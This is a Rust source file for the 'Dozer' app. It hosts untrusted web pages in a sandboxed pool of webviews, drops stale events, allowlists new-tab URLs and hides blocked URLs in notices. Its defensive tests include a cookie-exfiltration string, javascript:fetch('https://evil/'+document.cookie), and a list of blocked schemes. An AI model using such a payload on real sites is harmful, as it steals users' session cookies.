//! 浏览器面板的原生层:用 bytehost 的 `WebPool`(不可信页面的多页签子视图池)承载网页。
//!
//! 浏览器里是**任意网页**,所以它不再和可信预览共用 `runtime::sync_webview_pool` 的构建器:池自己持有全部
//! wry 句柄,不注册自定义协议(没有 `dozer://`)、不注入脚本、不装 IPC 处理器——页面看不到 `window.ipc`;
//! 导航与新窗口走 `bytehost_webview::browse` 白名单,下载一律拒绝。这些由 bytehost 的源码钉死测试守着,本文件
//! 的钉死测试再确认 Dozer 这边没有绕开它(见 `docs/superpowers/plans/2026-10-28-dozer-browser-untrusted-webview.md`)。
//!
//! Dozer 自带 winit 事件循环、不执行 iced `Task`,所以用池的**同步**接口(`apply` / `navigate_now` / `with_view` …),
//! 都在事件循环所在的主线程调用。池的事件(页面加载 / 标题 / 新窗口 / 无响应)由一个小桥线程翻译成既有的
//! `Message::Browser*` 经事件环代理送回,过期代号(切项目、切首页之后迟到的)在桥线程里就丢掉。

use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::mpsc::channel;

use bytehost_core::LogicalRect;
use bytehost_desktop::web_child::{WebEvent, WebNav, WebPool, WebTabSpec};
use bytehost_webview::browse::allows_new_tab;
use winit::event_loop::EventLoopProxy;

use crate::app::Message;
use crate::extensions::{browser, toast};
use crate::preview::WebviewSpec;

dozer_core::scope!(LOG, panel, "web");

/// 页面现在属于谁:哪个项目(首页全局浏览器没有项目)、是不是首页。上下文一变就是新的一代,整池销毁重建
/// (页签 id 是各自 `Tabs` 的计数器,跨项目 / 跨首页会撞号)。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Context {
    pub project_id: Option<i64>,
    pub home: bool,
}

pub struct BrowserNative {
    pool: WebPool,
    epoch: Arc<AtomicU64>,
    generation: u64,
    context: Option<Context>,
}

impl BrowserNative {
    pub fn new(proxy: EventLoopProxy<Message>) -> Self {
        let (web_tx, web_rx) = channel();
        let epoch = Arc::new(AtomicU64::new(0));
        let bridge_epoch = epoch.clone();
        // wry 的回调在主线程、不能阻塞;池走标准库通道,这里用一个线程把事件翻译后经事件环代理送回。
        // 池被丢弃、发送端关闭时线程自然结束。
        std::thread::spawn(move || {
            while let Ok(event) = web_rx.recv() {
                if let Some(message) = translate(&event, bridge_epoch.load(Ordering::SeqCst))
                    && proxy.send_event(message).is_err()
                {
                    break;
                }
            }
        });
        Self {
            pool: WebPool::new(epoch.clone(), web_tx),
            epoch,
            generation: 0,
            context: None,
        }
    }

    /// 进入某个上下文:和上一次不同就开新的一代(此前所有在途事件作废),返回当前代号。
    fn enter(&mut self, context: Context) -> u64 {
        if self.context != Some(context) {
            self.generation += 1;
            self.epoch.store(self.generation, Ordering::SeqCst);
            self.context = Some(context);
        }
        self.generation
    }

    /// 没有上下文了(没有当前项目也不在首页):销毁全部,并让在途事件作废。
    fn leave(&mut self) -> bool {
        if self.context.take().is_some() {
            self.generation += 1;
            self.epoch.store(self.generation, Ordering::SeqCst);
            true
        } else {
            false
        }
    }

    /// 让池收敛到库的页签清单。`specs` 为空(面板没显示)时池里的页面全部销毁,与改动前的行为一致。
    /// `rect` 是 `(x, y, w, h)` 逻辑像素;`scale` 是全局界面缩放。主线程。
    pub fn sync(
        &mut self,
        window: &winit::window::Window,
        context: Option<Context>,
        specs: &[WebviewSpec],
        rect: (f32, f32, f32, f32),
        scale: f64,
    ) -> Result<(), String> {
        let Some(context) = context else {
            if self.leave() {
                self.pool.destroy_all_now();
            }
            return Ok(());
        };
        let generation = self.enter(context);
        let tabs: Vec<WebTabSpec> = specs
            .iter()
            .map(|s| WebTabSpec {
                id: s.id,
                url: s.url.clone(),
                visible: s.visible,
            })
            .collect();
        let rect = LogicalRect {
            x: f64::from(rect.0),
            y: f64::from(rect.1),
            width: f64::from(rect.2),
            height: f64::from(rect.3),
        };
        self.pool.apply(window, generation, &tabs, rect, scale)
    }

    /// 后退 / 前进 / 刷新(对指定页签)。主线程。
    pub fn nav(&self, tab: usize, action: browser::NavAction) {
        let nav = match action {
            browser::NavAction::Back => WebNav::Back,
            browser::NavAction::Forward => WebNav::Forward,
            browser::NavAction::Refresh => WebNav::Refresh,
        };
        self.pool.navigate_now(self.generation, tab, nav);
    }

    /// 把键盘焦点给页签的 webview(`FocusIntent::Browser`)。返回有没有这个页签。主线程。
    pub fn focus(&self, tab: usize) -> bool {
        self.pool
            .with_view(self.generation, tab, |view| {
                let _ = view.focus();
            })
            .is_some()
    }

    /// 在页签的页面里查找(命中即选中并滚动过去,恒回绕)。结果稍后作为 `WebEvent::FindResult` 经桥线程变成
    /// `Message::Browser(FindResult)` 送回。主线程。
    pub fn find(&self, tab: usize, query: &str, backwards: bool) -> bool {
        // 大小写不敏感:浏览器地址栏旁的轻量查找条没有「区分大小写」开关。
        self.pool
            .find(self.generation, tab, query, backwards, false)
    }

    /// 关掉查找条 / 清空查找词:清掉页面里的命中选区。主线程。
    pub fn clear_find(&self, tab: usize) {
        self.pool.clear_find(self.generation, tab);
    }

    /// 全局界面缩放变了:同步给池里已有的全部页面。主线程。
    pub fn zoom_all(&self, scale: f64) {
        self.pool.zoom_all(self.generation, scale);
    }

    /// 把等得太久的导航作为事件送出(不碰 webview)。
    pub fn poll_stalled(&self) {
        self.pool.poll_stalled(std::time::Instant::now());
    }

    /// 当前这一代(测试用)。
    #[cfg(test)]
    fn generation(&self) -> u64 {
        self.generation
    }
}

/// 提示里的网址最多留这么多字符(查询串可能很长,也可能带令牌)。
const NOTICE_URL_CHARS: usize = 80;

fn shorten(url: &str) -> String {
    let head: String = url.chars().take(NOTICE_URL_CHARS).collect();
    if url.chars().count() > NOTICE_URL_CHARS {
        format!("{head}…")
    } else {
        head
    }
}

/// 只报 scheme,不回显网址其余部分(`javascript:` 后面可能是一大段代码)。
fn scheme_of(url: &str) -> String {
    match url.split_once(':') {
        Some((scheme, _))
            if !scheme.is_empty()
                && scheme.len() <= 16
                && scheme
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.')) =>
        {
            format!("{}:", scheme.to_ascii_lowercase())
        }
        _ => "?".to_owned(),
    }
}

fn notice(key: &'static str, fallback: &'static str, arg: (&'static str, String)) -> Message {
    Message::Toast(toast::Message::Push {
        scope: LOG,
        level: toast::Level::Warning,
        text: dozer_model::LocalizedText::keyed(crate::i18n::HOST_OWNER, key, fallback)
            .with_arg(arg.0, arg.1),
        // 同一类提示连续出现只留最新一条。
        key: Some(key.to_owned()),
    })
}

/// 池事件 → 既有的浏览器消息。`current` 是当前有效的代号;不属于它的(切项目 / 切首页之后迟到的)一律丢弃。
/// 池已经按白名单放行过新窗口请求,这里再确认一次(纵深防御)。
fn translate(event: &WebEvent, current: u64) -> Option<Message> {
    match event {
        WebEvent::PageLoaded {
            generation,
            id,
            url,
        } if *generation == current => Some(Message::BrowserNavigated(*id, url.clone())),
        WebEvent::TitleChanged {
            generation,
            id,
            title,
        } if *generation == current => Some(Message::BrowserTitle(*id, title.clone())),
        WebEvent::NewTabRequested { generation, url }
            if *generation == current && allows_new_tab(url) =>
        {
            Some(Message::BrowserNewWindow(url.clone()))
        }
        WebEvent::NavigationStalled {
            generation, url, ..
        } if *generation == current => Some(notice(
            "web.nav_stalled",
            "The page is not responding: {url}",
            ("url", shorten(url)),
        )),
        WebEvent::FindResult {
            generation,
            query,
            matched,
            ..
        } if *generation == current => Some(Message::Browser(browser::Message::FindResult(
            query.clone(),
            *matched,
        ))),
        WebEvent::NavigationBlocked {
            generation, url, ..
        } if *generation == current => Some(notice(
            "web.nav_blocked",
            "This kind of address is not supported ({scheme})",
            ("scheme", scheme_of(url)),
        )),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn loaded(generation: u64, id: usize, url: &str) -> WebEvent {
        WebEvent::PageLoaded {
            generation,
            id,
            url: url.into(),
        }
    }

    fn debug(m: Option<Message>) -> String {
        format!("{m:?}")
    }

    /// 换上下文(换项目、首页 ↔ 工作区)就是新的一代,同一个上下文保持同一代;`leave` 之后什么都不认。
    #[test]
    fn a_new_context_is_a_new_generation_and_the_same_context_is_not() {
        let (tx, _rx) = channel();
        let epoch = Arc::new(AtomicU64::new(0));
        let mut native = BrowserNative {
            pool: WebPool::new(epoch.clone(), tx),
            epoch,
            generation: 0,
            context: None,
        };
        let a = Context {
            project_id: Some(1),
            home: false,
        };
        let b = Context {
            project_id: Some(2),
            home: false,
        };
        let home = Context {
            project_id: None,
            home: true,
        };
        let g_a = native.enter(a);
        assert_eq!(native.enter(a), g_a, "同一个上下文保持同一代");
        let g_b = native.enter(b);
        assert_ne!(g_a, g_b);
        let g_home = native.enter(home);
        assert_ne!(g_b, g_home);
        // 换回去也是新的一代(不复用旧页面,页签 id 会撞号)。
        assert_ne!(native.enter(a), g_a);
        assert!(native.leave());
        assert!(!native.leave(), "已经没有上下文:不再变化");
        assert_eq!(native.epoch.load(Ordering::SeqCst), native.generation());
    }

    #[test]
    fn stale_generation_events_are_dropped() {
        for event in [
            loaded(1, 3, "https://a.com/"),
            WebEvent::TitleChanged {
                generation: 1,
                id: 3,
                title: "x".into(),
            },
            WebEvent::NewTabRequested {
                generation: 1,
                url: "https://a.com/".into(),
            },
            WebEvent::NavigationStalled {
                generation: 1,
                id: 3,
                url: "https://a.com/".into(),
            },
            WebEvent::FindResult {
                generation: 1,
                id: 3,
                query: "x".into(),
                matched: true,
            },
        ] {
            assert!(translate(&event, 2).is_none(), "{event:?}");
        }
    }

    #[test]
    fn page_events_become_the_existing_browser_messages() {
        let got = translate(&loaded(5, 3, "https://a.com/x"), 5);
        assert_eq!(
            debug(got),
            debug(Some(Message::BrowserNavigated(3, "https://a.com/x".into())))
        );
        let got = translate(
            &WebEvent::TitleChanged {
                generation: 5,
                id: 3,
                title: "T".into(),
            },
            5,
        );
        assert_eq!(
            debug(got),
            debug(Some(Message::BrowserTitle(3, "T".into())))
        );
    }

    /// 查找结果带着当时的查找词回到库(库据此丢弃慢的旧结果)。
    #[test]
    fn a_find_result_becomes_the_librarys_find_result_message() {
        let got = translate(
            &WebEvent::FindResult {
                generation: 5,
                id: 3,
                query: "needle".into(),
                matched: false,
            },
            5,
        );
        assert_eq!(
            debug(got),
            debug(Some(Message::Browser(browser::Message::FindResult(
                "needle".into(),
                false
            ))))
        );
    }

    #[test]
    fn a_new_tab_request_is_opened_only_if_the_url_is_allowed() {
        let request = |url: &str| WebEvent::NewTabRequested {
            generation: 5,
            url: url.into(),
        };
        assert_eq!(
            debug(translate(&request("https://a.com/new"), 5)),
            debug(Some(Message::BrowserNewWindow("https://a.com/new".into())))
        );
        for bad in [
            "javascript:alert(1)",
            "data:text/html,x",
            "dozer://a/b",
            "file://share/x",
        ] {
            assert!(translate(&request(bad), 5).is_none(), "{bad}");
        }
    }

    /// 提示不回显网址的其余部分(令牌 / 脚本),长网址被截短。
    #[test]
    fn notices_are_short_and_do_not_echo_the_rest_of_a_blocked_url() {
        let long = format!("https://example.com/{}", "a".repeat(500));
        let stalled = translate(
            &WebEvent::NavigationStalled {
                generation: 5,
                id: 1,
                url: long,
            },
            5,
        )
        .expect("stalled notice");
        let text = format!("{stalled:?}");
        assert!(text.contains('…'), "{text}");
        assert!(text.len() < 600, "提示里的网址要被截短");
        let blocked = translate(
            &WebEvent::NavigationBlocked {
                generation: 5,
                id: 1,
                url: "javascript:fetch('https://evil/'+document.cookie)".into(),
            },
            5,
        )
        .expect("blocked notice");
        let text = format!("{blocked:?}");
        assert!(text.contains("javascript:"));
        assert!(!text.contains("evil"), "不回显网址其余部分: {text}");
    }

    /// 钉死:Dozer 这边没有绕开不可信内容的设置去自己建浏览器 webview——本文件不建 wry 视图、不装协议 / 脚本 / IPC,
    /// `runtime.rs` 里为浏览器面板特设的分支(`report_title`、标题回报脚本、页面事件钩子)已经删掉。
    #[test]
    fn dozer_does_not_build_its_own_browser_webviews() {
        let src = include_str!("browser_native.rs");
        let prod = &src[..src.find("#[cfg(test)]").unwrap()];
        for forbidden in [
            "WebViewBuilder",
            "with_custom_protocol",
            "with_ipc_handler",
            "with_initialization_script",
            "with_html(",
            "evaluate_script",
        ] {
            assert!(!prod.contains(forbidden), "不得出现 {forbidden}");
        }
        // 没有 Edit 菜单,页面里的 ⌘A/⌘C/⌘V/⌘X/⌘F 全都不工作:启动时必须装,且只装一次。
        let window_events = include_str!("platform/window_events.rs");
        let prod_events = &window_events[..window_events
            .find("#[cfg(test)]")
            .unwrap_or(window_events.len())];
        assert_eq!(
            prod_events.matches("install_standard_edit_menu()").count(),
            1,
            "窗口启动时必须恰好装一次 Edit 菜单"
        );
        let runtime = include_str!("runtime.rs");
        for gone in ["report_title", "window.__dozer_webview", "BrowserNavigated"] {
            assert!(
                !runtime.contains(gone),
                "runtime.rs 里浏览器专用分支应已删除,仍有 {gone}"
            );
        }
    }

    /// 页内查找的接线:⌘F 菜单项启动时装一次;库的查找请求在 `sync_previews` 里被执行,且 Search 带上结果回调、
    /// Clear 清选区;焦点请求与几何(首页和工作区两条)都读库的 `find_bar_extra_px`。
    #[test]
    fn find_is_wired_to_the_shortcut_the_pool_and_the_geometry() {
        let events = include_str!("platform/window_events.rs");
        let prod = &events[..events.find("#[cfg(test)]").unwrap_or(events.len())];
        assert_eq!(prod.matches("install_find_shortcut(").count(), 1);
        for required in [
            "take_browser_find_requests()",
            "FindRequest::Search { query, backwards }",
            "FindRequest::Clear",
            "take_browser_find_focus_pending()",
            "find_field_id()",
            "home_browser_find_extra_px()",
        ] {
            assert!(prod.contains(required), "window_events.rs 缺少 {required}");
        }
        // 查找结果经池的事件通道回来,在这里翻译成库的 `FindResult`。
        let this = include_str!("browser_native.rs");
        let prod_this = &this[..this.find("#[cfg(test)]\nmod tests").unwrap()];
        assert!(prod_this.contains("WebEvent::FindResult {"));
        let app = include_str!("app/app.rs");
        assert!(
            app.contains("find_bar_extra_px("),
            "几何的额外高度必须来自库"
        );
    }
}
